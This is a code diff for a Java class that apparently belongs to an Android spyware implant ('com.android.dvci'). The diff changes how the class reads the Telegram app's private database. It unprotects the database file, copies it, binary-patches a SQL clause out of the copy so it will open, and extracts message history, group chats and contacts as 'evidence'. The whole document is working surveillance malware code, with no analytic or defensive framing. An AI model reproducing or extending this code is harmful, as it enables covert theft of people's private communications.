@@ -10,10 +10,14 @@ import com.android.dvci.db.RecordHashPairVisitor;
 import com.android.dvci.db.RecordVisitor;
 import com.android.dvci.file.Path;
 import com.android.dvci.module.ModuleAddressBook;
+import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.StringUtils;
+import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import org.apache.http.util.ByteArrayBuffer;
+import org.apache.http.util.EncodingUtils;
 import org.w3c.dom.Document;
 import org.w3c.dom.NamedNodeMap;
 import org.w3c.dom.Node;
@@ -21,11 +25,16 @@ import org.w3c.dom.NodeList;
 import org.xml.sax.SAXException;
 
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.nio.MappedByteBuffer;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Date;
 import java.util.List;
 import java.util.concurrent.Semaphore;
@@ -123,7 +132,8 @@ public class ChatTelegram extends SubModuleChat {
 				Check.log(TAG + " (start), read lastTelegram: " + lastTelegram);
 			}
 
-			helper = GenericSqliteHelper.open(dbFile);
+			//helper = GenericSqliteHelper.open(dbFile);
+			helper = openCopy(dbFile);
 			if (helper == null) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (updateHistory) cannot open db");
@@ -150,6 +160,7 @@ public class ChatTelegram extends SubModuleChat {
 				Check.log(TAG + " (updateHistory) Error: " + e);
 			}
 		} finally {
+			helper.deleteDb();
 			readChatSemaphore.release();
 		}
 	}
@@ -179,7 +190,7 @@ public class ChatTelegram extends SubModuleChat {
 			Path.unprotect(dbFile, 3, true);
 			Path.unprotect(dbFile + "*", true);
 
-			helper = GenericSqliteHelper.openCopy(dbFile);
+			helper = openCopy(dbFile);
 			if (helper == null) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (start) cannot open db");
@@ -197,6 +208,7 @@ public class ChatTelegram extends SubModuleChat {
 					Check.log(TAG + " (start) serialize: %d", lastmessage);
 				}
 				markup.serialize(lastmessage);
+				lastTelegram = lastmessage;
 			}
 
 			helper.deleteDb();
@@ -210,6 +222,67 @@ public class ChatTelegram extends SubModuleChat {
 			readChatSemaphore.release();
 		}
 
+	}
+
+	public static boolean truncatedEquals(byte[] x, int start, byte[] y) {
+		int upperBound = Math.min(x.length - start, y.length);
+		for (int i = 0; i < upperBound; i++) {
+			if (x[i + start] != y[i]) {
+				return false;
+			}
+		}
+		return true;
+	}
+
+	byte[] buf = new byte[1024 * 100];
+
+	private synchronized GenericSqliteHelper openCopy(String dbFile) {
+		String before = "WHERE mid < 0 AND send_state = 1";
+		String after  = "                                ";
+		byte[] b = EncodingUtils.getAsciiBytes(before);
+		byte[] a = EncodingUtils.getAsciiBytes(after);
+
+		File fs = new File(dbFile);
+		dbFile = fs.getAbsolutePath();
+		if (!(Path.unprotect(dbFile, 4, false) && fs.exists() && fs.canRead())) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (openCopy) ERROR: no suitable db file");
+			}
+			return null;
+		}
+
+		String localFile = Path.markup() + fs.getName();
+		File local = new File(localFile);
+		try {
+			InputStream in = new FileInputStream(new File(dbFile));
+			OutputStream out = new FileOutputStream(local);
+
+			// Transfer bytes from in to out
+			int len;
+			boolean found = false;
+			while ((len = in.read(buf)) > 0) {
+				for(int i = 0; i< len; i++){
+					if( !found && truncatedEquals(buf, i, b )){
+						System.arraycopy(a, 0 , buf, i, a.length);
+						found = true;
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (openCopy), found binary at position: " + i);
+						}
+					}
+				}
+				out.write(buf, 0, len);
+			}
+			in.close();
+			out.close();
+		} catch (IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (openCopy), error: " + e);
+			}
+			return null;
+		}
+
+		GenericSqliteHelper helper = new GenericSqliteHelper(localFile, true);
+		return helper;
 	}
 
 	private Account readAddressContacts() throws SAXException, IOException, ParserConfigurationException {
@@ -317,6 +390,8 @@ public class ChatTelegram extends SubModuleChat {
 				Check.log(TAG + " (readTelegramMessageHistory) Error: ", ex);
 			}
 			return 0;
+		}finally{
+
 		}
 
 	}
@@ -330,7 +405,7 @@ public class ChatTelegram extends SubModuleChat {
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
 			MessageRecordVisitor visitor = new MessageRecordVisitor(messages);
-			long lastmessage = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastTelegram)}, visitor);
+			long lastmessage = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastTelegram)}, visitor, false);
 
 			if (!messages.isEmpty()) {
 				getModule().saveEvidence(messages);
@@ -354,7 +429,7 @@ public class ChatTelegram extends SubModuleChat {
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 		MessageRecordVisitor visitor = new MessageRecordVisitor(messages);
 
-		long lastmessage = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastTelegram)}, visitor);
+		long lastmessage = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastTelegram)}, visitor, false);
 
 		if (!messages.isEmpty()) {
 			getModule().saveEvidence(messages);
@@ -379,7 +454,7 @@ public class ChatTelegram extends SubModuleChat {
 				Check.log(TAG + " (readTelegramGroupChatHistory) uid: " + Long.toString(-tc.uid));
 			}
 			long lastmessage = helper.traverseRawQuery(sqlquery,
-					new String[]{Long.toString(lastTelegram), Long.toString(-tc.uid)}, visitor);
+					new String[]{Long.toString(lastTelegram), Long.toString(-tc.uid)}, visitor, false);
 
 			if (!messages.isEmpty()) {
 				getModule().saveEvidence(messages);
@@ -470,7 +545,7 @@ public class ChatTelegram extends SubModuleChat {
 			}
 		};
 
-		helper.traverseRawQuery(sqlquery, null, visitor);
+		helper.traverseRawQuery(sqlquery, null, visitor, true);
 
 		if (Cfg.DEBUG) {
 			for (String group : groups.getAllGroups()) {
